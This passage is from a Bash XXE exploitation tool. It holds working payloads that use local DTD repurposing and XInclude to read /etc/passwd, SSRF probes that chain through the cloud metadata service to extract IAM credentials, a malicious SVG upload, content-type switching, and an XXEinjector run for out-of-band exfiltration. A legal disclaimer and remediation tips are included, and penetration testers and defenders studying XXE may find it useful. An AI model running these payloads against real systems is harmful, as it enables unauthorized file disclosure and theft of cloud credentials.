        VULNS_FOUND+=("Error-Based XXE - $TARGET_FILE leaked in error")
        FILES_EXTRACTED+=("$TARGET_FILE (via error)")
        VULN_COUNT=$((VULN_COUNT + 1))
        SEVERITY="CRITICAL"
    elif echo "$body" | grep -qiE "(No such file|nonexistent|file not found)" 2>/dev/null; then
        log_info "Server shows file errors - error-based XXE may be possible"
        echo "ERROR_FILE_MESSAGES=true" >> "$RESULTS_FILE"
    fi

    # Technique 2: Local DTD repurposing
    log_test "Test 2: Local DTD repurposing (docbookx.dtd)..."
    payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/yelp/dtd/docbookx.dtd"> <!ENTITY % ISOamso '"'"'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;'"'"'> %local_dtd; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
    result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "error_localdtd")
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if echo "$body" | grep -qE "(root:|nobody:|daemon:)" 2>/dev/null; then
        log_vuln "Local DTD repurposing successful! File leaked!"
        echo "$body" > "$SCAN_DIR/error_localdtd_extracted.txt"
        VULNS_FOUND+=("Error-Based XXE via Local DTD (docbookx.dtd)")
        FILES_EXTRACTED+=("/etc/passwd (via local DTD)")
        VULN_COUNT=$((VULN_COUNT + 1))
        SEVERITY="CRITICAL"
    fi

    # Technique 3: Try fonts.dtd
    log_test "Test 3: Local DTD repurposing (fonts.dtd)..."
    payload='<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE foo [ <!ENTITY % local_dtd SYSTEM "file:///usr/share/xml/fontconfig/fonts.dtd"> <!ENTITY % expr '"'"'<!ENTITY &#x25; file SYSTEM "file:///etc/passwd"> <!ENTITY &#x25; eval "<!ENTITY &#x26;#x25; error SYSTEM &#x27;file:///nonexistent/&#x25;file;&#x27;>"> &#x25;eval; &#x25;error;'"'"'> %local_dtd; ]><stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>'
    result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "error_fontsdtd")
    response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
    [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

    if echo "$body" | grep -qE "(root:|nobody:|daemon:)" 2>/dev/null; then
        log_vuln "Local DTD repurposing (fonts.dtd) successful!"
        echo "$body" > "$SCAN_DIR/error_fontsdtd_extracted.txt"
        VULNS_FOUND+=("Error-Based XXE via Local DTD (fonts.dtd)")
        FILES_EXTRACTED+=("/etc/passwd (via fonts.dtd)")
        VULN_COUNT=$((VULN_COUNT + 1))
        SEVERITY="CRITICAL"
    fi

    return 0
}

# ──────────────── Mode: SSRF ────────────────
scan_ssrf() {
    log_section "XXE-BASED SSRF"

    local ssrf_urls=(
        "$INTERNAL_URL"
        "http://169.254.169.254/"
        "http://169.254.169.254/latest/"
        "http://169.254.169.254/latest/meta-data/"
        "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
        "http://127.0.0.1/"
        "http://localhost/"
        "http://[::1]/"
        "http://127.0.0.1:8080/"
        "http://127.0.0.1:8443/"
        "http://127.0.0.1:3000/"
    )

    for ssrf_url in "${ssrf_urls[@]}"; do
        log_test "SSRF probe: $ssrf_url"
        local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"$ssrf_url\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
        local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "ssrf_$(echo $ssrf_url | md5sum 2>/dev/null | cut -c1-8 || echo $RANDOM)")
        local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        local body=""
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)
        local resp_size=$(echo "$result" | grep "RESP_SIZE=" | cut -d= -f2)

        # Check for SSRF success indicators
        if [ "${resp_size:-0}" -gt 100 ] 2>/dev/null; then
            if echo "$body" | grep -qiE "(iam|security-credentials|AccessKeyId|SecretAccessKey|Token|ami-id|instance-id|hostname|local-ipv4)" 2>/dev/null; then
                log_vuln "SSRF via XXE - Cloud metadata exposed!"
                log_critical "URL accessible: $ssrf_url"
                echo "$body" > "$SCAN_DIR/ssrf_$(echo $ssrf_url | tr '/:.' '_').txt"
                VULNS_FOUND+=("SSRF via XXE: $ssrf_url")
                VULN_COUNT=$((VULN_COUNT + 1))
                SEVERITY="CRITICAL"
            elif echo "$body" | grep -qiE "(html|body|title|server|apache|nginx|tomcat)" 2>/dev/null; then
                log_vuln "SSRF via XXE - Internal service response!"
                echo "$body" > "$SCAN_DIR/ssrf_$(echo $ssrf_url | tr '/:.' '_').txt"
                VULNS_FOUND+=("SSRF via XXE: $ssrf_url")
                VULN_COUNT=$((VULN_COUNT + 1))
                [ "$SEVERITY" = "INFO" ] || [ "$SEVERITY" = "MEDIUM" ] && SEVERITY="HIGH"
            fi
        fi
    done

    # SSRF chain: follow redirects to find credential paths
    if echo "${VULNS_FOUND[@]}" | grep -q "metadata" 2>/dev/null; then
        log_test "Attempting to chain SSRF to extract IAM credentials..."
        # Try to read IAM role name first
        local iam_payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
        local iam_result=$(send_payload "$iam_payload" "$TARGET_URL" "application/xml" "POST" "ssrf_iam_role")
        local iam_file=$(echo "$iam_result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        [ -f "$iam_file" ] && local role_name=$(cat "$iam_file" 2>/dev/null | tr -d '[:space:]')

        if [ -n "$role_name" ] && [ ${#role_name} -gt 1 ] && [ ${#role_name} -lt 100 ]; then
            log_info "IAM role found: $role_name"
            local creds_payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"http://169.254.169.254/latest/meta-data/iam/security-credentials/$role_name\"> ]><stockCheck><productId>\&xxe;</productId><storeId>1</storeId></stockCheck>"
            local creds_result=$(send_payload "$creds_payload" "$TARGET_URL" "application/xml" "POST" "ssrf_iam_creds")
            local creds_file=$(echo "$creds_result" | grep "RESPONSE_FILE=" | cut -d= -f2)
            [ -f "$creds_file" ] && log_critical "IAM credentials extracted! See: $creds_file"
        fi
    fi

    return 0
}

# ──────────────── Mode: XINCLUDE ────────────────
scan_xinclude() {
    log_section "XINCLUDE INJECTION"

    local files_to_try=("$TARGET_FILE" "/etc/passwd" "/etc/hostname")

    for target_f in "${files_to_try[@]}"; do
        log_test "XInclude for: $target_f"

        # Payload as parameter value (typical scenario)
        local payload="<foo xmlns:xi=\"http://www.w3.org/2001/XInclude\"><xi:include parse=\"text\" href=\"file://$target_f\"/></foo>"
        local result=$(send_payload "$payload" "$TARGET_URL" "application/xml" "POST" "xinclude_$(basename $target_f)")
        local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        local body=""
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

        if echo "$body" | grep -qE "(root:|nobody:|daemon:|www-data:)" 2>/dev/null; then
            log_vuln "XInclude injection successful! File: $target_f"
            echo "$body" > "$SCAN_DIR/xinclude_$(basename $target_f).txt"
            VULNS_FOUND+=("XInclude Injection: $target_f")
            FILES_EXTRACTED+=("$target_f")
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="CRITICAL"
        fi

        # Try as URL-encoded parameter
        log_test "XInclude in form parameter for: $target_f"
        local encoded_payload="productId=%3Cfoo+xmlns%3Axi%3D%22http%3A%2F%2Fwww.w3.org%2F2001%2FXInclude%22%3E%3Cxi%3Ainclude+parse%3D%22text%22+href%3D%22file%3A%2F%2F$(echo $target_f | sed 's|/|%2F|g')%22%2F%3E%3C%2Ffoo%3E&storeId=1"
        result=$(send_payload "$encoded_payload" "$TARGET_URL" "application/x-www-form-urlencoded" "POST" "xinclude_form_$(basename $target_f)")
        response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

        if echo "$body" | grep -qE "(root:|nobody:|daemon:)" 2>/dev/null; then
            log_vuln "XInclude via form parameter successful!"
            echo "$body" > "$SCAN_DIR/xinclude_form_$(basename $target_f).txt"
            VULNS_FOUND+=("XInclude via Form Param: $target_f")
            FILES_EXTRACTED+=("$target_f")
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="CRITICAL"
        fi
    done

    return 0
}

# ──────────────── Mode: SVG UPLOAD ────────────────
scan_svg_upload() {
    log_section "XXE VIA SVG UPLOAD"

    local upload_url="${UPLOAD_ENDPOINT:-$TARGET_URL}"
    local target_f="${TARGET_FILE:-/etc/hostname}"

    log_test "Creating malicious SVG..."
    local svg_file="$SCAN_DIR/xxe_payload.svg"
    cat > "$svg_file" << SVGEOF
<?xml version="1.0" standalone="yes"?>
<!DOCTYPE test [ <!ENTITY xxe SYSTEM "file://$target_f"> ]>
<svg width="500px" height="500px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
  <text font-size="40" x="0" y="60">&xxe;</text>
</svg>
SVGEOF

    log_info "SVG payload saved: $svg_file"
    log_test "Uploading malicious SVG to: $upload_url"

    local curl_args=(-sk -X POST
        --max-time "$TIMEOUT"
        -F "avatar=@$svg_file;type=image/svg+xml"
        -w "\n---HTTP_CODE:%{http_code}---"
        -o "$SCAN_DIR/response_svg_upload.txt"
    )

    if [ -n "$SESSION_COOKIE" ]; then
        curl_args+=(-H "Cookie: $SESSION_COOKIE")
    fi
    if [ -n "$PROXY" ]; then
        curl_args+=(--proxy "$PROXY")
    fi

    curl_args+=("$upload_url")

    local meta=$(curl "${curl_args[@]}" 2>/dev/null)
    local http_code=$(echo "$meta" | grep -oP 'HTTP_CODE:\K[0-9]+' 2>/dev/null || echo "000")

    if [ "$http_code" = "200" ] || [ "$http_code" = "302" ] || [ "$http_code" = "201" ]; then
        log_success "SVG uploaded successfully (HTTP $http_code)"
        log_info "Check if the rendered SVG/image shows file content"
        VULNS_FOUND+=("SVG Upload XXE - File uploaded successfully")
        echo "SVG_UPLOADED=true" >> "$RESULTS_FILE"
    else
        log_warning "SVG upload returned HTTP $http_code"
    fi

    # Also try multipart with different field names
    for field_name in "file" "image" "upload" "photo" "picture" "attachment"; do
        log_test "Trying upload field: $field_name"
        curl -sk -X POST --max-time "$TIMEOUT" \
            -F "${field_name}=@$svg_file;type=image/svg+xml" \
            ${SESSION_COOKIE:+-H "Cookie: $SESSION_COOKIE"} \
            ${PROXY:+--proxy "$PROXY"} \
            -o "$SCAN_DIR/response_svg_${field_name}.txt" \
            "$upload_url" 2>/dev/null

        local resp_f="$SCAN_DIR/response_svg_${field_name}.txt"
        if [ -f "$resp_f" ]; then
            local body=$(cat "$resp_f" 2>/dev/null)
            if echo "$body" | grep -qiE "(success|uploaded|saved|created)" 2>/dev/null; then
                log_success "Upload accepted with field name: $field_name"
            fi
        fi
    done

    return 0
}

# ──────────────── Mode: CONTENT TYPE SWITCH ────────────────
scan_content_type_switch() {
    log_section "CONTENT-TYPE SWITCHING"

    local content_types=(
        "application/xml"
        "text/xml"
        "application/xhtml+xml"
        "application/soap+xml"
        "text/html"
    )

    for ct in "${content_types[@]}"; do
        log_test "Testing Content-Type: $ct"
        local payload="<?xml version=\"1.0\" encoding=\"UTF-8\"?><!DOCTYPE foo [ <!ENTITY xxe SYSTEM \"file://$TARGET_FILE\"> ]><root><value>\&xxe;</value></root>"
        local result=$(send_payload "$payload" "$TARGET_URL" "$ct" "POST" "ct_switch_$(echo $ct | tr '/' '_')")
        local http_code=$(echo "$result" | grep "HTTP_CODE=" | cut -d= -f2)
        local response_file=$(echo "$result" | grep "RESPONSE_FILE=" | cut -d= -f2)
        local body=""
        [ -f "$response_file" ] && body=$(cat "$response_file" 2>/dev/null)

        if [ "$http_code" != "415" ] && [ "$http_code" != "000" ]; then
            log_info "Server accepts $ct (HTTP $http_code)"

            if echo "$body" | grep -qE "(root:|nobody:|daemon:)" 2>/dev/null; then
                log_vuln "XXE via Content-Type switch ($ct)!"
                VULNS_FOUND+=("XXE via Content-Type: $ct")
                VULN_COUNT=$((VULN_COUNT + 1))
                SEVERITY="CRITICAL"
            fi
        fi
    done

    return 0
}

# ──────────────── XXEinjector Integration ────────────────
run_xxeinjector() {
    log_section "XXEINJECTOR ADVANCED EXPLOITATION"

    if [ "$XXEINJECTOR_AVAILABLE" != true ] || [ "$RUBY_AVAILABLE" != true ]; then
        log_warning "XXEinjector or Ruby not available, skipping"
        return 1
    fi

    if [ -z "$HOST_IP" ]; then
        log_error "XXEinjector requires --host parameter"
        return 1
    fi

    # Create request file for XXEinjector
    local req_file="$SCAN_DIR/xxeinjector_request.txt"
    cat > "$req_file" << REQEOF
POST $(echo "$TARGET_URL" | sed -E 's|https?://[^/]+||') HTTP/1.1
Host: $TARGET_HOST
Content-Type: application/xml
Content-Length: CONTENT_LENGTH
${SESSION_COOKIE:+Cookie: $SESSION_COOKIE}

<?xml version="1.0" encoding="UTF-8"?>
XXEINJECT
<stockCheck><productId>1</productId><storeId>1</storeId></stockCheck>
REQEOF

    log_info "Request file created: $req_file"

    # Run XXEinjector OOB mode
    log_test "Running XXEinjector (OOB mode)..."
    local xxe_cmd="ruby $XXEINJECTOR_DIR/XXEinjector.rb --host=$HOST_IP --file=$req_file --path=$TARGET_FILE --oob=$OOB_METHOD --rhost=$TARGET_HOST --verbose"

    if echo "$TARGET_URL" | grep -q "https" 2>/dev/null; then
        xxe_cmd+=" --ssl"
    fi

    local rport=$(echo "$TARGET_URL" | grep -oP ':\K[0-9]+' | head -1)
    if [ -n "$rport" ]; then
        xxe_cmd+=" --rport=$rport"
    fi

    log_info "Command: $xxe_cmd"
    eval "$xxe_cmd" 2>&1 | tee "$SCAN_DIR/xxeinjector_output.log" &
    local xxe_pid=$!

    # Wait for XXEinjector with timeout
    local xxe_timeout=60
    local waited=0
    while kill -0 $xxe_pid 2>/dev/null && [ $waited -lt $xxe_timeout ]; do
        sleep 2
        waited=$((waited + 2))
    done

    if kill -0 $xxe_pid 2>/dev/null; then
        kill $xxe_pid 2>/dev/null
        log_warning "XXEinjector timed out after ${xxe_timeout}s"
    fi

    # Analyze XXEinjector results
    if [ -f "$SCAN_DIR/xxeinjector_output.log" ]; then
        local xxe_output=$(cat "$SCAN_DIR/xxeinjector_output.log")

        if echo "$xxe_output" | grep -qi "successfully" 2>/dev/null; then
            log_vuln "XXEinjector found vulnerability!"
            VULNS_FOUND+=("XXEinjector: Advanced exploitation successful")
            VULN_COUNT=$((VULN_COUNT + 1))
            SEVERITY="CRITICAL"
        fi

        # Check for retrieved files
        if [ -d "$XXEINJECTOR_DIR/Logs" ]; then
            local retrieved_files=$(find "$XXEINJECTOR_DIR/Logs" -type f -newer "$req_file" 2>/dev/null)
            if [ -n "$retrieved_files" ]; then
                log_success "XXEinjector retrieved files:"
                echo "$retrieved_files" | while read f; do
                    log_info "  → $f"
                    cp "$f" "$SCAN_DIR/" 2>/dev/null
                done
            fi
        fi
    fi

    return 0
}

# ═══════════════════════════════════════════════════════════════
#  FULL SCAN MODE
# ═══════════════════════════════════════════════════════════════
scan_full() {
    log_section "FULL COMPREHENSIVE XXE SCAN"
    log_info "Running all detection and exploitation techniques..."
    echo ""

    # Phase 1: Detection
    scan_detect
    echo ""

    # Phase 2: Classic XXE
    scan_classic
    echo ""

    # Phase 3: Blind OOB
    scan_blind_oob
    echo ""

    # Phase 4: Error-based
    scan_error_based
    echo ""

    # Phase 5: SSRF
    scan_ssrf
    echo ""

    # Phase 6: XInclude
    scan_xinclude
    echo ""

    # Phase 7: Content-Type switching
    scan_content_type_switch
    echo ""

    # Phase 8: SVG Upload (only if upload endpoint specified)
    if [ -n "$UPLOAD_ENDPOINT" ]; then
        scan_svg_upload
        echo ""
    fi

    # Phase 9: XXEinjector (if available and requested)
    if [ "$USE_XXEINJECTOR" = true ] || [ "$XXEINJECTOR_AVAILABLE" = true ]; then
        run_xxeinjector
        echo ""
    fi

    # Phase 10: Blind exfiltration (if callback available)
    if [ -n "$COLLABORATOR_URL" ] || [ -n "$HOST_IP" ]; then
        scan_blind_exfil
        echo ""
    fi
}

# ═══════════════════════════════════════════════════════════════
#  FINAL REPORT
# ═══════════════════════════════════════════════════════════════
generate_report() {
    local end_time=$(date +%s)
    local duration=$((end_time - START_TIME))
    local minutes=$((duration / 60))
    local seconds=$((duration % 60))

    # Determine severity color
    local sev_color="$GREEN"
    case "$SEVERITY" in
        CRITICAL) sev_color="$BG_RED$WHITE" ;;
        HIGH)     sev_color="$RED" ;;
        MEDIUM)   sev_color="$YELLOW" ;;
        LOW)      sev_color="$BLUE" ;;
        INFO)     sev_color="$GREEN" ;;
    esac

    echo ""
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "${WHITE}${BOLD}  XXE VULNERABILITY SCAN REPORT${NC}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""
    echo -e "  ${WHITE}Target:${NC}     $TARGET_URL"
    echo -e "  ${WHITE}Mode:${NC}       $SCAN_MODE"
    echo -e "  ${WHITE}Date:${NC}       $(date '+%Y-%m-%d %H:%M:%S')"
    echo -e "  ${WHITE}Duration:${NC}   ${minutes}m ${seconds}s"
    echo -e "  ${WHITE}Results:${NC}    $SCAN_DIR"
    echo ""

    # Detection Summary
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  DETECTION RESULTS${NC}"
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"

    local check_result
    for check in "XML_PARSER_DETECTED" "XML_REFLECTED" "INTERNAL_ENTITIES" "DOCTYPE_ALLOWED" "DOCTYPE_BLOCKED" "TEXT_XML_ACCEPTED" "XML_PARSER_ERROR"; do
        if [ -f "$RESULTS_FILE" ] && grep -q "${check}=true" "$RESULTS_FILE" 2>/dev/null; then
            check_result="${GREEN}[✓]${NC}"
        else
            check_result="${RED}[✗]${NC}"
        fi
        local readable_name=$(echo "$check" | sed 's/_/ /g' | sed 's/\b\(.\)/\u\1/g' 2>/dev/null || echo "$check")
        echo -e "  $check_result $readable_name"
    done
    echo ""

    # Vulnerabilities
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  VULNERABILITIES FOUND: ${VULN_COUNT}${NC}"
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"

    if [ $VULN_COUNT -gt 0 ]; then
        local i=1
        for vuln in "${VULNS_FOUND[@]}"; do
            echo -e "  ${RED}[${i}]${NC} $vuln"
            i=$((i + 1))
        done
    else
        echo -e "  ${GREEN}No vulnerabilities confirmed${NC}"
        echo -e "  ${DIM}(Check callback server for blind XXE results)${NC}"
    fi
    echo ""

    # Extracted Files
    if [ ${#FILES_EXTRACTED[@]} -gt 0 ]; then
        echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
        echo -e "${WHITE}${BOLD}  EXTRACTED FILES${NC}"
        echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
        local i=1
        for f in "${FILES_EXTRACTED[@]}"; do
            echo -e "  ${GREEN}[${i}]${NC} $f"
            i=$((i + 1))
        done
        echo ""
    fi

    # Recommendations
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  RECOMMENDATIONS${NC}"
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "  ${YELLOW}•${NC} Disable DTD processing in XML parser"
    echo -e "  ${YELLOW}•${NC} Set disallow-doctype-decl = true"
    echo -e "  ${YELLOW}•${NC} Disable external entity resolution"
    echo -e "  ${YELLOW}•${NC} Use safe XML libraries (defusedxml for Python)"
    echo -e "  ${YELLOW}•${NC} Validate & sanitize XML input"
    echo -e "  ${YELLOW}•${NC} Block outbound connections from app server"
    echo ""

    # Scan files
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "${WHITE}${BOLD}  SCAN FILES${NC}"
    echo -e "${CYAN}───────────────────────────────────────────────────────────────${NC}"
    echo -e "  ${DIM}Log:${NC}        $LOG_FILE"
    echo -e "  ${DIM}Results:${NC}    $RESULTS_FILE"
    echo -e "  ${DIM}Responses:${NC}  $SCAN_DIR/response_*.txt"
    if [ -f "$SCAN_DIR/evil_exfil.dtd" ]; then
        echo -e "  ${DIM}Evil DTD:${NC}   $SCAN_DIR/evil_exfil.dtd"
    fi
    echo ""

    # Final severity
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo -e "  ${WHITE}SEVERITY:${NC} ${sev_color} ${SEVERITY} ${NC}  ${WHITE}|${NC}  Vulnerabilities: ${VULN_COUNT}  ${WHITE}|${NC}  Files: ${#FILES_EXTRACTED[@]}"
    echo -e "${CYAN}═══════════════════════════════════════════════════════════════${NC}"
    echo ""

    # Save report
    {
        echo "XXE SCAN REPORT"
        echo "==============="
        echo "Target: $TARGET_URL"
        echo "Mode: $SCAN_MODE"
        echo "Date: $(date)"
        echo "Duration: ${minutes}m ${seconds}s"
        echo "Severity: $SEVERITY"
        echo "Vulnerabilities: $VULN_COUNT"
        echo ""
        echo "VULNERABILITIES:"
        for vuln in "${VULNS_FOUND[@]}"; do
            echo "  - $vuln"
        done
        echo ""
        echo "FILES EXTRACTED:"
        for f in "${FILES_EXTRACTED[@]}"; do
            echo "  - $f"
        done
    } > "$SCAN_DIR/report.txt"
}

# ═══════════════════════════════════════════════════════════════
#  MAIN EXECUTION
# ═══════════════════════════════════════════════════════════════
main() {
    parse_args "$@"
    banner

    # Legal disclaimer
    echo -e "${YELLOW}╔══════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${YELLOW}║  ${RED}${BOLD}WARNING: This tool is for authorized testing only!${NC}${YELLOW}          ║${NC}"
    echo -e "${YELLOW}║  ${NC}Unauthorized use against systems you don't own${YELLOW}             ║${NC}"
    echo -e "${YELLOW}║  ${NC}or have permission to test is illegal.${YELLOW}                     ║${NC}"
    echo -e "${YELLOW}╚══════════════════════════════════════════════════════════════╝${NC}"
    echo ""

    log_info "Target: $TARGET_URL"
    log_info "Mode: $SCAN_MODE"
    log_info "Output: $SCAN_DIR"
    log_info "Timestamp: $TIMESTAMP"

    # Check dependencies
    check_deps

    # Run selected mode
    case "$SCAN_MODE" in
        detect)       scan_detect ;;
        classic)      scan_classic ;;
        blind-oob)    scan_blind_oob ;;
        blind-exfil)  scan_blind_exfil ;;
        error-based)  scan_error_based ;;
        ssrf)         scan_ssrf ;;
        xinclude)     scan_xinclude ;;
        svg-upload)   scan_svg_upload ;;
        ct-switch)    scan_content_type_switch ;;
        full)         scan_full ;;
        *)
            log_error "Unknown mode: $SCAN_MODE"
            log_info "Available modes: detect, classic, blind-oob, blind-exfil, error-based, ssrf, xinclude, svg-upload, ct-switch, full"
            exit 1
            ;;
    esac

    # Generate final report
    generate_report

    # Import XXE results into the ML Dataset
    log_info "Importing XXE responses into ML dataset..."
    python c:/cnn_data/update_xxe_dataset.py

    # Exit code based on findings
    if [ $VULN_COUNT -gt 0 ]; then
        exit 0
    else
        exit 1
    fi
}

# Run main
main "$@"
